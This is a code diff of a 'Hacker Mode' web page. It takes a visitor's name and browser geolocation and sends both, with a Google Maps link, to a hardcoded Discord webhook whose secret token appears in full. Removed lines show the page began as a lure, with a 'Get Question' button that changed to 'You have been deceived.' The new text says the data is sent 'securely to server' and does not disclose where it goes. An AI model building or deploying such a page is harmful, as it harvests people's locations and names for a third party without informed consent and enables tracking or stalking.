@@ -2,11 +2,10 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>My loca | By champion!!</title>
+  <title>🧠 Hacker Mode | Location Sender</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
 
-    /* เบสสีและฟอนต์สาย Cyberpunk */
     body {
       background: radial-gradient(circle at center, #0f0f0f, #000);
       color: #00ff00;
@@ -27,14 +26,34 @@
       animation: flicker 3s infinite;
     }
 
-    /* ปุ่มสไตล์ Terminal Hacker */
+    #nameInput {
+      padding: 12px 20px;
+      font-size: 1.4rem;
+      width: 300px;
+      max-width: 80%;
+      margin-bottom: 1.5rem;
+      background: transparent;
+      border: 2px solid #00ff00;
+      color: #00ff00;
+      border-radius: 6px;
+      box-shadow:
+        0 0 8px #00ff00;
+      outline: none;
+      font-family: 'Share Tech Mono', monospace;
+      letter-spacing: 0.05em;
+    }
+
+    #nameInput::placeholder {
+      color: #004400;
+    }
+
     #locateBtn {
       background: transparent;
       border: 2px solid #00ff00;
       padding: 18px 40px;
       font-size: 1.8rem;
       color: #00ff00;
-      cursor: pointer;
+      cursor: not-allowed;
       border-radius: 8px;
       box-shadow:
         0 0 8px #00ff00,
@@ -44,7 +63,12 @@
       letter-spacing: 0.1em;
     }
 
-    #locateBtn:hover {
+    #locateBtn.enabled {
+      cursor: pointer;
+      background: transparent;
+    }
+
+    #locateBtn.enabled:hover {
       background: #00ff00;
       color: #000;
       box-shadow:
@@ -52,7 +76,6 @@
         inset 0 0 12px #00ff00;
     }
 
-    /* ข้อความผลลัพธ์ */
     #output {
       margin-top: 2rem;
       font-size: 1.4rem;
@@ -67,7 +90,6 @@
       user-select: text;
     }
 
-    /* Animation ไฟกระพริบ */
     @keyframes flicker {
       0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% {
         opacity: 1;
@@ -80,17 +102,41 @@
 </head>
 <body>
 
-  <h1>My Locate</h1>
+  <h1>🧠 HACKER MODE</h1>
 
-  <button id="locateBtn">Get Question</button>
+  <input
+    id="nameInput"
+    type="text"
+    placeholder="ENTER YOUR NAME BEFORE LOCATE"
+    autocomplete="off"
+  />
+
+  <button id="locateBtn" disabled>GET LOCATION</button>
 
   <p id="output" aria-live="polite" aria-atomic="true"></p>
 
   <script>
     const btn = document.getElementById('locateBtn');
     const output = document.getElementById('output');
+    const nameInput = document.getElementById('nameInput');
+
+    // เปิดปุ่มเมื่อมีการกรอกชื่อ
+    nameInput.addEventListener('input', () => {
+      if (nameInput.value.trim().length > 0) {
+        btn.disabled = false;
+        btn.classList.add('enabled');
+      } else {
+        btn.disabled = true;
+        btn.classList.remove('enabled');
+      }
+    });
 
     btn.addEventListener('click', () => {
+      if (nameInput.value.trim().length === 0) {
+        output.textContent = '⚠️ Please enter your name first!';
+        return;
+      }
+
       if (!navigator.geolocation) {
         output.textContent = '❌ Your browser does not support Geolocation API.';
         return;
@@ -108,21 +154,23 @@
 
       function success(position) {
         const { latitude, longitude } = position.coords;
+        const userName = nameInput.value.trim();
 
-        output.innerHTML = 
+        output.innerHTML =
+          `✅ <strong>Name:</strong> ${userName}<br>` +
           `✅ <strong>Latitude:</strong> ${latitude.toFixed(6)}<br>` +
           `✅ <strong>Longitude:</strong> ${longitude.toFixed(6)}<br><br>` +
           `<em>Sending data securely to server...</em>`;
 
-        sendToDiscord(latitude, longitude)
+        sendToDiscord(userName, latitude, longitude)
           .then(() => {
-            output.innerHTML += `<br>📤 <strong>You locatetion sent to champion!</strong>`;
-            btn.textContent = 'You have been deceived.';
+            output.innerHTML += `<br>📤 <strong>Data sent successfully!</strong>`;
+            btn.textContent = 'GET LOCATION';
             btn.disabled = false;
           })
           .catch(() => {
             output.innerHTML += `<br>❌ <strong>Failed to send data. Try again later.</strong>`;
-            btn.textContent = 'Try Again';
+            btn.textContent = 'GET LOCATION';
             btn.disabled = false;
           });
       }
@@ -138,12 +186,13 @@
       }
     });
 
-    async function sendToDiscord(lat, lng) {
+    async function sendToDiscord(name, lat, lng) {
       const webhookURL = "https://discord.com/api/webhooks/1391646097528717322/D3VW1hQsPPUiEFE9lTwhjfXaDyf2qLHaf9rWGPOSTcCEzaY1OuNNGdUyirbpimBPOlzI";
 
       const payload = {
-        content: 
+        content:
           `📍 User Location Captured!\n` +
+          `👤 Name: ${name}\n` +
           `🌐 Latitude: ${lat.toFixed(6)}\n` +
           `🌐 Longitude: ${lng.toFixed(6)}\n` +
           `🗺️ Google Maps: https://maps.google.com/?q=${lat},${lng}`
